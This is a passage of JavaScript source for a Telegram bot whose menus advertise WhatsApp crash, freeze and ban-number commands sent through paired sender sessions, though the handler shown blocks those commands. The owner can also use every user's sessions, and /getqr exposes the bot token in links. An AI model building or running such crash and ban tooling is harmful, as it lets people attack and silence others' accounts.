                type: "heading",
                text: "📱 Android Bug",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/fc",
                        "Android Forceclose Invisible",
                        "🔴 High"
                    ],
					[
                        "/heavy",
                        "Android freeze 100% invisible",
                        "🟡 MEDIUM"
                    ],
					[
                        "/delay",
                        "Android delay system",
                        "🟡 MEDIUM"
                    ],
                    [
                        "/freeze",
                        "Freeze Android message",
                        "🔴 High"
                    ],
                    [
                        "/uistuck",
                        "Android UI message system",
                        "🔴 High"
                    ]
                ]
            ),
            gap,
            {
                type: "heading",
                text: "🍎 iPhone Bug",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/ioshard",
                        "Freeze IOS message system",
                        "🔴 High"
                    ],
                    [
                        "/ioslite",
                        "Crash IOS (not for all)",
                        "🟡 MEDIUM"
                    ]
					
                ]
            ),
            gap,
            {
                type: "heading",
                text: "👥 Group - Bug",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/crashgroup",
                        "Crash WhatsApp group feature",
                        "🔴 High"
                    ],
                    [
                        "/bandgroup",
                        "Ban WhatsApp group feature",
                        "🔴 High"
                    ]
                ]
            ),
            gap,
            {
                type: "heading",
                text: "📢 Channel - Bug",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/crashch",
                        "Crash WhatsApp channel feature",
                        "🟢 Low"
                    ]
                ]
            ),
			gap,
            {
                type: "heading",
                text: "🔥 Band - Tools",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/banwa",
                        "Band Whatsapp number,channel,group",
                        "🟡 Medium"
                    ]
                ]
            )
        ];

                await bot.api.raw.sendRichMessage({
                    chat_id: ctx.chat.id,
                    rich_message: { blocks },
                    reply_markup: keyboard
                });
            }


        // ----------- ( fungsi: sendToolsMenu ) ------------ //

            async function sendToolsMenu(ctx) {
                const keyboard = {
                    inline_keyboard: [
                        [{ text: "𝗕𝗔𝗖𝗞 - 𝗠𝗘𝗡𝗨", callback_data: "back_menu", style: "danger", icon_custom_emoji_id: "5780864206177834457" }]
                    ]
                };

                const blocks = [
                    { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
                    { type: "heading", text: [{ type: "custom_emoji", custom_emoji_id: "5462921117423384478", alternative_text: "🛠" }, " TOOLS MENU\n "], size: 1 },
                    {
                        type: "table",
                        cells: [
                            [
                                { text: "Command", is_header: true, align: "center", valign: "middle" },
                                { text: "Info", is_header: true, align: "center", valign: "middle" }
                            ],
                            [{ text: "/tiktok" }, { text: "TikTok No Watermark" }],
                            [{ text: "/ig" }, { text: "Instagram Video/Reel" }],
                            [{ text: "/play" }, { text: "Search Spotify Songs" }],
                            [{ text: "/convert" }, { text: "Convert Photo/Video" }],
                            [{ text: "/iqc" }, { text: "iPhone Screenshot" }],
                            [{ text: "/getqr" }, { text: "Photo to QR Code" }],
                            [{ text: "/brat" }, { text: "Brat Text Sticker" }],
                            [{ text: "/tr" }, { text: "Translate Text" }],
                            [{ text: "/tts" }, { text: "Text to Voice Note" }],
                            [{ text: "/rembg" }, { text: "Remove Photo Background" }],
                            [{ text: "/quote" }, { text: "Random Quote / Motivation" }],
                            [{ text: "/meme" }, { text: "Meme Generator" }],
                            [{ text: "/sticker" }, { text: "Photo to Sticker" }],
                            [{ text: "/weather" }, { text: "Check City Weather" }],
                            [{ text: "/short" }, { text: "Shorten Link" }],
                            [{ text: "/hdfoto" }, { text: "Enhance Photo to HD (Upscale + Sharpen)" }],
                            [{ text: "/sound" }, { text: "Extract Audio from Video" }],
                            [{ text: "/hdvideo" }, { text: "Enhance Video to HD (Upscale + Sharpen)" }],
                            [{ text: "/gethtml" }, { text: "Clone Website from URL" }]
                        ],
                        is_bordered: true,
                        is_striped: true
                    }
                ];

                await bot.api.raw.sendRichMessage({
                    chat_id: ctx.chat.id,
                    rich_message: { blocks },
                    reply_markup: keyboard
                });
            }


        // ----------- ( fungsi: sendOsintMenu ) ------------ //

            async function sendOsintMenu(ctx) {
                const keyboard = {
                    inline_keyboard: [
                        [{ text: "𝗕𝗔𝗖𝗞 - 𝗠𝗘𝗡𝗨", callback_data: "back_menu", style: "danger", icon_custom_emoji_id: "6267140231632262769" }]
                    ]
                };

                const blocks = [
                    { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
                    { type: "heading", text: [{ type: "custom_emoji", custom_emoji_id: "6267140231632262769", alternative_text: "🕵️" }, " OSINT MENU\n "], size: 1 },
                    {
                        type: "paragraph",
                        text: "All of these commands only retrieve PUBLIC/technical information (such as domain details, IP information, SSL certificates, and public profile page availability). They are not intended to track or obtain anyone's private personal information.\n"
                    },
                    {
                        type: "table",
                        cells: [
                            [
                                { text: "Command", is_header: true, align: "center", valign: "middle" },
                                { text: "Info", is_header: true, align: "center", valign: "middle" }
                            ],
                            [{ text: "/whois" }, { text: "Domain Registration" }],
                            [{ text: "/dns" }, { text: "Domain DNS Records" }],
                            [{ text: "/ipinfo" }, { text: "IP Info & ISP" }],
                            [{ text: "/ssl" }, { text: "SSL Certificate Info" }],
                            [{ text: "/cekusername" }, { text: "Username Checker" }]
                        ],
                        is_bordered: true,
                        is_striped: true
                    }
                ];

                await bot.api.raw.sendRichMessage({
                    chat_id: ctx.chat.id,
                    rich_message: { blocks },
                    reply_markup: keyboard
                });
            }


        // ----------- ( fungsi: sendFixCodeMenu ) ------------ //

            async function sendFixCodeMenu(ctx) {
                const keyboard = {
                    inline_keyboard: [
                        [{ text: "𝗕𝗔𝗖𝗞 - 𝗠𝗘𝗡𝗨", callback_data: "back_menu", style: "danger", icon_custom_emoji_id: "6028477720856367105" }]
                    ]
                };

                const blocks = [
                    { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
                    { type: "heading", text: [{ type: "custom_emoji", custom_emoji_id: "6028477720856367105", alternative_text: "🔧" }, " ALL FIX KODE\n "], size: 1 },
                    {
                        type: "table",
                        cells: [
                            [
                                { text: "Command", is_header: true, align: "center", valign: "middle" },
                                { text: "Info", is_header: true, align: "center", valign: "middle" }
                            ],
                            [{ text: "/cekfunction" }, { text: "Check Code Errors" }],
                            [{ text: "/getqr" }, { text: "Photo to QR Code" }],
                            [{ text: "/fixcode" }, { text: "Format JavaScript File" }],
                            [{ text: "/encjs" }, { text: "Encrypt to Bytecode" }],
                            [{ text: "/deobfuscate" }, { text: "Deobfuscate Code" }],
                            [{ text: "/testfunction" }, { text: "Test WA Functions" }],
                            [{ text: "/lint" }, { text: "Find Code Warnings/Errors" }],
                            [{ text: "/statcode" }, { text: "Code Statistics" }],
                            [{ text: "/extractfunc" }, { text: "List All Functions" }],
                            [{ text: "/beautify" }, { text: "Beautify Code" }],
                            [{ text: "/minify" }, { text: "Minify Code" }],
                            [{ text: "/diffcode" }, { text: "Compare Two Files" }],
                            [{ text: "/validatejson" }, { text: "Validate JSON Syntax" }]
                        ],
                        is_bordered: true,
                        is_striped: true
                    }
                ];

                await bot.api.raw.sendRichMessage({
                    chat_id: ctx.chat.id,
                    rich_message: { blocks },
                    reply_markup: keyboard
                });
            }


        // ----------- ( fungsi: sendAllMenu ) ------------ //

            async function sendAllMenu(ctx) {
                const keyboard = {
                    inline_keyboard: [
                        [{ text: "𝗕𝗔𝗖𝗞 - 𝗠𝗘𝗡𝗨", callback_data: "back_menu", style: "danger", icon_custom_emoji_id: "5188481279963715781" }],
                        [{ text: "𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗡𝗧𝗔𝗖𝗧", url: "https://t.me/" + (OWNER_USERNAME || "telegram"), style: "success", icon_custom_emoji_id: "6267140231632262769" }]
                    ]
                };

                const menuGroup = [
                    {
                       title: "📱 PAIR MENU",
                       data: [
                           ["/pair", "Pair WhatsApp", "Premium"],
                           ["/delpair", "Delete Session", "Premium"],
                           ["/listpair", "Sender List", "User"],
                           ["/clearpair", "Clear All Sessions", "Owner"]
                        ]
                      },
                      {
                        title: "🦠 MESSAGE MENU",
                        data: [
                           ["/freeze", "Send Android Message", "Premium"],
						   ["/fc", "Send crash invisible", "Premium"],
                           ["/delay", "Send with Delay", "Premium"],
                           ["/ioshard", "Send iOS freeze", "Premium"],
                           ["/uistuck", "Send Visible Bug", "Premium"],
                           ["/crashgroup", "Send to Group", "Premium"]
                       ]
                     },
                     {
                        title: "🍃 PREMIUM MENU",
                        data: [
                           ["/addprem", "Add Premium", "Admin"],
                           ["/delprem", "Remove Premium", "Admin"],
                           ["/listprem", "Premium List", "Admin"]
                       ]
                     },
                     {
                        title: "🛠 TOOLS MENU",
                        data: [
                           ["/tiktok", "TikTok No Watermark", "All"],
                           ["/ig", "Instagram Video/Reel", "All"],
                           ["/play", "Search Spotify Songs", "All"],
                           ["/convert", "Convert Photo/Video", "All"],
                           ["/iqc", "iPhone Screenshot", "All"],
                           ["/getqr", "Photo to QR Code", "All"],
                           ["/brat", "Brat Text Sticker", "All"],
                           ["/tr", "Translate Text", "All"],
                           ["/tts", "Text to Voice Note", "All"],
                           ["/rembg", "Remove Photo Background", "All"],
                           ["/quote", "Random Quote", "All"],
                           ["/meme", "Meme Generator", "All"],
                           ["/sticker", "Photo to Sticker", "All"],
                           ["/weather", "Check Weather", "All"],
                           ["/short", "Shorten Link", "All"],
                           ["/hdfoto", "Enhance Photo to HD", "All"],
                           ["/sound", "Extract Audio", "All"],
                           ["/hdvideo", "Enhance Video to HD", "All"],
                           ["/gethtml", "Clone Website", "All"]
                      ]
                    },
                    {
                      title: "🕵️ OSINT MENU",
                      data: [
                         ["/whois", "Domain Registration", "All"],
                         ["/dns", "Domain DNS Records", "All"],
                         ["/ipinfo", "IP Info & ISP", "All"],
                         ["/ssl", "SSL Certificate Info", "All"],
                         ["/cekusername", "Username Checker", "All"]
                      ]
                    },
                    {
                      title: "🔧 FIXCODE MENU",
                      data: [
                         ["/cekfunction", "Check Code Errors", "All"],
                         ["/fixcode", "Format JavaScript File", "All"],
                         ["/deobfuscate", "Deobfuscate Code", "All"],
                         ["/encjs", "Encrypt to Bytecode", "All"],
                         ["/lint", "Find Code Warnings/Errors", "All"],
                         ["/statcode", "Code Statistics", "All"],
                         ["/extractfunc", "List All Functions", "All"],
                         ["/beautify", "Beautify Code", "All"],
                         ["/minify", "Minify Code", "All"],
                         ["/diffcode", "Compare Two Files", "All"],
                         ["/validatejson", "Validate JSON Syntax", "All"],
                         ["/testfunction", "Test with Dummy Socket", "Admin"]
                      ]
                    },
                    {
                     title: "🪐 ADMIN MENU",
                     data: [
                         ["/addadmin", "Add Admin", "Owner"],
                         ["/deladmin", "Remove Admin", "Owner"],
                         ["/listadmin", "Admin List", "Owner"]
                       ]
                     },
                     {
                      title: "⚙️ SYSTEM MENU",
                      data: [
                         ["/mode", "Bot Mode", "Owner"],
                         ["/start", "Main Menu", "All"],
                         ["/menu", "All Commands", "All"]
                         ]
                     }
                  ];
// menu addbot/delbot/listbot/broadcast cuma nongol di bot utama
                if (!isSubBot) {
                    menuGroup.splice(1, 0, {
                        title: "🛰️ DEPLOY MENU",
                        data: [
                            ["/addbot", "Deploy bot baru", "Premium"],
                            ["/delbot", "Hapus bot", "Premium"],
                            ["/listbot", "List bot milikku", "Premium"],
                            ["/bc", "Broadcast", "Admin"]
                        ]
                    });
                }

                const blocks = [
                    { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
                    { type: "heading", text: [{ type: "custom_emoji", custom_emoji_id: "5188481279963715781", alternative_text: "✨" }, " NAVIYA BOT COMMAND\n"], size: 1 }
                ];

                for (const group of menuGroup) {
                    blocks.push({ type: "heading", text: group.title, size: 2 });

                    const cells = [
                        [
                            { text: "Command", is_header: true, align: "center", valign: "middle" },
                            { text: "Info", is_header: true, align: "center", valign: "middle" },
                            { text: "Access", is_header: true, align: "center", valign: "middle" }
                        ]
                    ];

                    group.data.forEach((item) => {
                        cells.push([
                            { text: item[0], align: "left", valign: "middle" },
                            { text: item[1], align: "left", valign: "middle" },
                            { text: item[2], align: "left", valign: "middle" }
                        ]);
                    });

                    blocks.push({ type: "table", cells, is_bordered: true, is_striped: true });
                    blocks.push({ type: "paragraph", text: "\n" });
                }

                await bot.api.raw.sendRichMessage({
                    chat_id: ctx.chat.id,
                    rich_message: { blocks },
                    reply_markup: keyboard
                });
            }

// ----------- ( fungsi: sendSXTable, table generik ) ------------ //

async function sendSXTable(ctx, title, cells) {
    return bot.api.raw.sendRichMessage({
        chat_id: ctx.chat.id,
        rich_message: {
            blocks: [
                { type: "heading", text: title, size: 1 },
                { type: "table", cells, is_bordered: true, is_striped: true }
            ]
        }
    });
}


// ----------- ( fungsi: actionSession, eksekusi single/multi sender ) ------------ //

// ----------- ( actionSession: eksekusi single/multi sender, with owner override ) ------------ //
async function actionSession(ctx, uid, target, func, resultFunc) {
    const isOwnerUser = checkOwner(uid);
    let sessions = [];

    // ── Owner: can see and use ALL sessions from ALL users ──
    if (isOwnerUser) {
        const allPairs = getAllPairs(); // returns { uid: [numbers] }
        for (const [userId, numbers] of Object.entries(allPairs)) {
            for (const number of numbers) {
                sessions.push({ uid: userId, number });
            }
        }
        if (!sessions.length) {
            return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
        }
    } else {
        // ── Regular user: only their own sessions ──
        sessions = getPairsForUser(uid).map(number => ({ uid, number }));
        if (!sessions.length) {
            return botError(ctx, "No senders found.", "⚠️ NO SESSION");
        }
    }

    // ── Single sender ──
    if (sessions.length === 1) {
        const { uid: sessionUid, number } = sessions[0];
        const client = getClient(sessionUid, number);

        if (!client?.sock || client.status !== "open") {
            return botError(ctx, `Session ${number} tidak aktif.`, "⚠️ SESSION OFFLINE");
        }

        try {
            await func(client.sock, target);
            return resultFunc(ctx, { type: "single", session: number, target });
        } catch (err) {
            return botError(ctx, err.message, "❌ EXECUTION FAILED");
        }
    }

    // ── Multi sender ──
    pendingAction.set(uid, { func, resultFunc, target });

    const keyboard = { inline_keyboard: [] };
    const cells = [
        [
            { text: "Status", is_header: true, align: "center", valign: "middle" },
            { text: "Session", is_header: true, align: "center", valign: "middle" }
        ]
    ];

    sessions.forEach(({ uid: sessionUid, number }) => {
        const display = isOwnerUser ? `${sessionUid} → ${number}` : number;
        cells.push([
            { text: "📱 Sender", align: "left", valign: "middle" },
            { text: display, align: "left", valign: "middle" }
        ]);

        // Owner: callback includes both UID and number
        // Regular user: callback only includes number (backward compatible)
        const callbackData = isOwnerUser ? `action_${sessionUid}_${number}` : `action_${number}`;
        keyboard.inline_keyboard.push([
            { text: `📱 ${display}`, callback_data: callbackData, style: "success", icon_custom_emoji_id: "6266777440039736768" }
        ]);
    });

    // ── "Send to all" button ──
    keyboard.inline_keyboard.push([
        { text: "📤 Semua Sender", callback_data: "action_all", style: "success", icon_custom_emoji_id: "5780864206177834457" }
    ]);

    return bot.api.raw.sendRichMessage({
        chat_id: ctx.chat.id,
        rich_message: {
            blocks: [
                { type: "heading", text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER"], size: 1 },
                { type: "table", cells, is_bordered: true, is_striped: true }
            ]
        },
        reply_markup: keyboard
    });
}

        // ----------- ( fungsi: wajib join channel/group ) ------------ //

            function normalizeForceJoinTarget(value) {
                const raw = String(value ?? "").trim();
                if (!raw) return null;

                if (/^https?:\/\/t\.me\//i.test(raw)) {
                    const pathPart = raw.replace(/^https?:\/\/t\.me\//i, "").split(/[/?#]/)[0];

                    // Invite links can be opened by the user, but Telegram cannot
                    // use the invite URL as the chat_id for getChatMember.
                    if (!pathPart || pathPart.startsWith("+") || pathPart.toLowerCase().startsWith("joinchat")) {
                        return { chatId: null, joinUrl: raw };
                    }

                    return {
                        chatId: pathPart.startsWith("@") ? pathPart : `@${pathPart}`,
                        joinUrl: raw
                    };
                }

                const chatId = raw.startsWith("@") || /^-?\d+$/.test(raw) ? raw : `@${raw}`;
                const joinUrl = raw.startsWith("@")
                    ? `https://t.me/${raw.slice(1)}`
                    : /^-?\d+$/.test(raw)
                        ? `https://t.me/c/${raw.replace(/^-100/, "")}`
                        : `https://t.me/${raw}`;

                return { chatId, joinUrl };
            }

            const FORCE_JOIN_CHANNELS = [
    FORCE_JOIN_CHANNEL,
    FORCE_JOIN_CHANNEL2,
    FORCE_JOIN_CHANNEL3,
    FORCE_JOIN_CHANNEL4,
    FORCE_JOIN_CHANNEL5,
].map(normalizeForceJoinTarget).filter(Boolean);

async function isUserJoinedChannel(uid) {
    if (FORCE_JOIN_CHANNELS.length === 0) return true;

    for (const target of FORCE_JOIN_CHANNELS) {
        if (!target.chatId) {
            log.warning("Force join invite links cannot be verified. Use @public_username or a numeric chat ID.");
            return false;
        }

        try {
            const member = await bot.api.getChatMember(target.chatId, uid);
            const isMember = member.status === "restricted" ? member.is_member === true : true;

            if (!isMember || !["member", "administrator", "creator", "restricted"].includes(member.status)) {
                return false;
            }
        } catch (error) {
            log.warning(`Force join check failed for ${target.chatId}: ${error?.description || error?.message || String(error)}`);
            return false;
        }
    }

    return true;
}

function joinChannelKeyboard() {
    const keyboard = {
        inline_keyboard: []
    };

    FORCE_JOIN_CHANNELS.forEach((target, index) => {
        if (target.joinUrl) {
            keyboard.inline_keyboard.push([
                {
                    text: `𝗝𝗢𝗜𝗡 𝗚𝗥𝗢𝗨𝗣/𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ${index + 1}`,
                    style: "success",
                    icon_custom_emoji_id: "5188481279963715781",
                    url: target.joinUrl
                }
            ]);
        }
    });

    keyboard.inline_keyboard.push([
        {
            text: "▶️ 𝗝𝗢𝗜𝗡 𝗬𝗢𝗨𝗧𝗨𝗕𝗘",
            style: "success",
            url: "https://www.youtube.com/@Justnation"
        }
    ]);

    keyboard.inline_keyboard.push([
        {
            text: "𝗗𝗢𝗡𝗘 𝗝𝗢𝗜𝗡",
            callback_data: "recheck_join",
            style: "success",
            icon_custom_emoji_id: "6267140231632262769"
        }
    ]);

    return keyboard;
}


        // ----------- ( handler: pesan masuk / command ) ------------ //

            bot.on("message:text", async (ctx) => {
                const text = ctx.message.text.trim();
                if (!text.startsWith("/")) return;

                const [cmdRaw, ...args] = text.split(/\s+/);
                const command = cmdRaw.slice(1).toLowerCase();
                const uid = String(ctx.from.id);

                // These legacy commands intentionally remain unavailable in this safe build.
                if (DISABLED_DISRUPTIVE_COMMANDS.has(command)) {
                    return botError(
                        ctx,
                        "Crash, flood, forced-close, ban, and disruptive payload commands are disabled.",
                        "🛡️ SAFETY BLOCK"
                    );
                }

                if (!isSubBot) addUser(uid);

                if (!isSubBot && !checkOwner(uid)) {
                    const joined = await isUserJoinedChannel(uid);

                    if (!joined) {
                        await botReply(
                            ctx,
                            "⚠️ ACCESS WARNING",
                            [
                                ["Access", "❌ Denied"],
                                ["Reason", "You must join the channel first"],
                                ["Action", "Join the channel and try again"]
                            ],
                            joinChannelKeyboard()
                        );
                        return;
                    }
                }

                switch (command) {

                    // ----------- ( menu utama ) ------------ //
                    case "start": {
                        await sendStartMenu(ctx);
                        break;
                    }

                    // ----------- ( tools menu ) ------------ //
                    case "tools": {
                        await sendToolsMenu(ctx);
                        break;
                    }

                    // ----------- ( fix code / devtools menu ) ------------ //
                    case "allfixkode": {
                        await sendFixCodeMenu(ctx);
                        break;
                    }

                    // ----------- ( tools: tiktok downloader ) ------------ //
                    case "tiktok":
                    case "tt": {
                        const q = args.join(" ").trim();

                        if (!q) {
                            return ctx.reply("❌ Contoh:\n/tiktok https://vt.tiktok.com/xxxxxx/");
                        }

                        if (!/tiktok\.com/.test(q)) {
                            return ctx.reply("❌ Link tidak valid. Pastikan itu link TikTok.");
                        }

                        let wait;
                        try {
                            wait = await ctx.reply("🪐 <code>[SYSTEM] Bypassing TikTok Core Server...</code>", { parse_mode: "HTML" });

                            const response = await fetch(`https://tikwm.com/api/?url=${encodeURIComponent(q)}`);
                            const resJson = await response.json();

                            if (!resJson || resJson.code !== 0 || !resJson.data) {
                                if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                                return ctx.reply("❌ Gagal mengambil video. Pastikan link TikTok-nya benar dan tidak diprivat.");
                            }

                            const datanya = resJson.data;
                            const vidnya = datanya.play;

                            if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

                            await botMediaReply(ctx, { video: vidnya }, "🎵 TIKTOK DOWNLOADER\n", [
                                ["Caption", datanya.title || "NO_CAPTION"],
                                ["Likes", Number(datanya.digg_count || 0).toLocaleString()],
                                ["Komentar", Number(datanya.comment_count || 0).toLocaleString()],
                                ["Share", Number(datanya.share_count || 0).toLocaleString()],
                                ["Views", Number(datanya.play_count || 0).toLocaleString()]
                            ]);

                        } catch (err) {
                            console.error("Error /tiktok:", err.message);
                            if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                            ctx.reply("❌ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.");
                        }
                        break;
                    }

                    // ----------- ( tools: get qr dari foto ) ------------ //
                    case "getqr": {
                        const replyMessage = ctx.message.reply_to_message;
                        if (!replyMessage || !replyMessage.photo) {
                            return ctx.reply("❌ Format Salah! Silakan balas (reply) sebuah FOTO lalu ketik /getqr");
                        }

                        let statusMsg;
                        try {
                            statusMsg = await ctx.reply("⏳ Sedang memproses foto dan membuat QR Code...");

                            const photoArray = replyMessage.photo;
                            const fileId = photoArray[photoArray.length - 1].file_id;

                            const fileData = await ctx.api.getFile(fileId);
                            const token = ctx.api.token;
                            const directPhotoUrl = `https://api.telegram.org/file/bot${token}/${fileData.file_path}`;

                            const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(directPhotoUrl)}`;

                            const keyboard = { inline_keyboard: [[{ text: '🖼 Lihat Foto Asli', url: directPhotoUrl }]] };
                            await botMediaReply(ctx, { photo: qrApiUrl }, "🔳 QR CODE GENERATOR\n", [
                                ["Status", "✅ Berhasil dibuat"],
                                ["Link Foto", directPhotoUrl]
                            ], keyboard);

                            if (statusMsg) await ctx.api.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
                        } catch (error) {
                            console.error("Error di /getqr:", error);
                            if (statusMsg) await ctx.api.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
                            ctx.reply(`❌ Gagal membuat QR Code: ${error.message}`);
                        }
                        break;
                    }

                    // ----------- ( tools: instagram downloader ) ------------ //
                    case "ig": {
                        const chatId = ctx.chat.id;
                        let loadMsg;
                        let filePath;

                        try {
                            const url = args.join(" ").trim();

                            if (!url) {
                                return ctx.reply("❌ Contoh:\n/ig https://www.instagram.com/reel/xxxxxx/");
                            }
                            if (!/instagram\.com/.test(url)) {
                                return ctx.reply("❌ Link tidak valid. Pastikan itu link Instagram.");
                            }

                            let youtubedl;
                            try {
                                const mod = await import("youtube-dl-exec");
                                youtubedl = mod.default || mod;
                            } catch {
                                return ctx.reply("❌ Module youtube-dl-exec belum terinstall.\nInstall dulu dengan: npm install youtube-dl-exec\nLalu restart bot.");
                            }

                            loadMsg = await ctx.reply("⏳ Mengambil media Instagram...");

                            filePath = path.join(os.tmpdir(), `ig_${chatId}_${Date.now()}.mp4`);
                            const cookiesPath = path.join(process.cwd(), 'lib', 'cookies_ig.txt');

                            const options = {
                                output: filePath,
                                noCheckCertificates: true,
                                noWarnings: true,
                                format: 'mp4/best'
                            };
                            if (fs.existsSync(cookiesPath)) options.cookies = cookiesPath;

                            await youtubedl(url, options);

                            if (loadMsg) await ctx.api.deleteMessage(chatId, loadMsg.message_id).catch(() => {});

                            if (!fs.existsSync(filePath) || fs.statSync(filePath).size === 0) {
                                return ctx.reply("❌ Gagal mengunduh. Pastikan link benar, postingan berupa video, dan akun tidak private.");
                            }

                            await botMediaReply(ctx, { video: new InputFile(filePath) }, "📸 INSTAGRAM DOWNLOADER\n", [
                                ["Status", "✅ Berhasil diunduh"],
                                ["Sumber", url]
                            ]);
                        } catch (err) {
                            console.error("Instagram Error:", err.message);
                            if (loadMsg) await ctx.api.deleteMessage(chatId, loadMsg.message_id).catch(() => {});
                            ctx.reply("❌ Gagal mengambil media Instagram.\n" + err.message);
                        } finally {
                            if (filePath && fs.existsSync(filePath)) {
                                try { fs.unlinkSync(filePath); } catch (e) { console.error("Gagal menghapus file temp:", e.message); }
                            }
                        }
                        break;
                    }

                    // ----------- ( tools: cari lagu spotify ) ------------ //
                    case "play": {
                        const text = args.join(" ");
                        if (!text) return ctx.reply("Example: /play Nina Feast");

                        try {
                            await ctx.reply("⏳ Sedang mencari lagu di Spotify...");

                            const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);

                            if (!data.status) return ctx.reply("❌ Lagu tidak ditemukan!");

                            const res = data.result;

                            await botMediaReply(ctx, { photo: res.thumbnail }, "🎧 SPOTIFY PLAY\n", [
                                ["Title", res.title],
                                ["Artist", res.artist],
                                ["Album", res.album],
                                ["Duration", res.duration],
                                ["Popularity", res.popularity],
                                ["Release", res.release_at]
                            ]);
                            await ctx.replyWithAudio(res.download_url, { title: res.title, performer: res.artist });
                        } catch (err) {
                            console.log(err);
                            ctx.reply("❌ Terjadi kesalahan saat mengambil data.");
                        }
                        break;
                    }

                    // ----------- ( tools: convert foto/video ke link catbox ) ------------ //
                    case "convert": {
                        const r = ctx.message.reply_to_message;
                        if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

                        let fileId = null;
                        if (r.photo && r.photo.length) {
                            fileId = r.photo[r.photo.length - 1].file_id;
                        } else if (r.video) {
                            fileId = r.video.file_id;
                        } else if (r.video_note) {
                            fileId = r.video_note.file_id;
                        } else {
                            return ctx.reply("❌ Hanya mendukung foto atau video");
                        }

                        const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

                        try {
                            const tgFile = await ctx.api.getFile(fileId);
                            const tgLink = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;

                            const params = new URLSearchParams();
                            params.append("reqtype", "urlupload");
                            params.append("url", tgLink);

                            const { data } = await axios.post(
                                "https://catbox.moe/user/api.php",
                                params,
                                { headers: { "content-type": "application/x-www-form-urlencoded" }, timeout: 30000 }
                            );

                            if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
                                await botReply(ctx, "📦 CONVERT TO LINK\n", [
                                    ["Status", "✅ Berhasil diunggah"],
                                    ["Link", data.trim()]
                                ]);
                            } else {
                                await botReply(ctx, "📦 CONVERT TO LINK\n", [
                                    ["Status", "❌ Gagal"],
                                    ["Detail", String(data).slice(0, 200)]
                                ]);
                            }
                        } catch (e) {
                            const msg = e?.response?.status
                                ? `❌ Error ${e.response.status} saat unggah ke catbox`
                                : "❌ Gagal unggah coba lagi.";
                            await ctx.reply(msg);
                        } finally {
                            try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                        }
                        break;
                    }

                    // ----------- ( tools: stiker teks brat ) ------------ //
                    case "brat": {
                        const text = args.join(" ");
                        if (!text) return ctx.reply("Example\n/brat Shocoisirr ganteng", { parse_mode: "Markdown" });

                        let filePath;
                        try {
                            await ctx.reply("Membuat stiker...");

                            const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
                            const response = await axios.get(url, { responseType: "arraybuffer" });

                            filePath = path.join(os.tmpdir(), `brat_${ctx.chat.id}_${Date.now()}.webp`);
                            fs.writeFileSync(filePath, response.data);

                            await ctx.replyWithSticker(new InputFile(filePath));
                        } catch (err) {
                            console.error("Error brat:", err.message);
                            ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
                        } finally {
                            if (filePath && fs.existsSync(filePath)) { try { fs.unlinkSync(filePath); } catch {} }
                        }
                        break;
                    }

                    // ----------- ( tools: screenshot iphone quoted ) ------------ //
                    case "iqc": {
                        const messageTextRaw = args.join(" ").trim();

                        if (!messageTextRaw) {
                            return ctx.reply("❌ Format salah. Contoh penggunaan:\n<code>/iqc halo apa kabar</code>", { parse_mode: "HTML" }).catch(() => {});
                        }

                        let prosesMsg;
                        try {
                            prosesMsg = await ctx.reply("⏳ <code>[SYSTEM] Generating quoted image...</code>", { parse_mode: "HTML" });
                        } catch (e) { break; }

                        const defaultTime = "18:00";
                        const defaultBattery = "100";
                        const defaultCarrier = "Indosat";

                        const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(defaultTime)}&batteryPercentage=${defaultBattery}&carrierName=${encodeURIComponent(defaultCarrier)}&messageText=${encodeURIComponent(messageTextRaw)}&emojiStyle=apple`;

                        try {
                            const res = await fetch(url);

                            if (!res.ok) {
                                console.error(`[API Error] HTTP Status: ${res.status}`);
                                if (prosesMsg) await ctx.api.deleteMessage(ctx.chat.id, prosesMsg.message_id).catch(() => {});
                                return ctx.reply(`❌ Gagal mengambil data dari API. (Status Error: ${res.status})`);
                            }

                            const arrayBuffer = await res.arrayBuffer();
                            const buffer = Buffer.from(arrayBuffer);

                            if (prosesMsg) await ctx.api.deleteMessage(ctx.chat.id, prosesMsg.message_id).catch(() => {});

                            await botMediaReply(ctx, { photo: new InputFile(buffer, "quoted.png") }, "📱 IQC GENERATOR\n", [
                                ["Status", "✅ Berhasil dibuat"],
                                ["Type", "iPhone Quoted"]
                            ]);
                        } catch (e) {
                            console.error("Error pada sistem /iqc:", e.message);
                            if (prosesMsg) await ctx.api.deleteMessage(ctx.chat.id, prosesMsg.message_id).catch(() => {});
                            ctx.reply("❌ Terjadi kesalahan saat menghubungi API atau server tujuan sedang down.").catch(() => {});
                        }
                        break;
